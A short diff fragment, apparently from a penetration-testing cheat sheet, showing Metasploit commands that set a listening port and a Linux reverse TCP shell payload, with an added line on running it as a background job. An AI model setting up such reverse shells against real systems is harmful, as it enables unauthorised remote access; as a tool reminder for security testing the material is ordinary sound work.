@@ -101,6 +101,7 @@ Sometimes we just forget how to use a tool. Here is a list of useful snippets fo
 	set lport 4444
 	set payload linux/x86/shell_reverse_tcp
 	run
+	    run -j -- to run as a job automatically
 
 	#Method 1
 	CTRL+Z
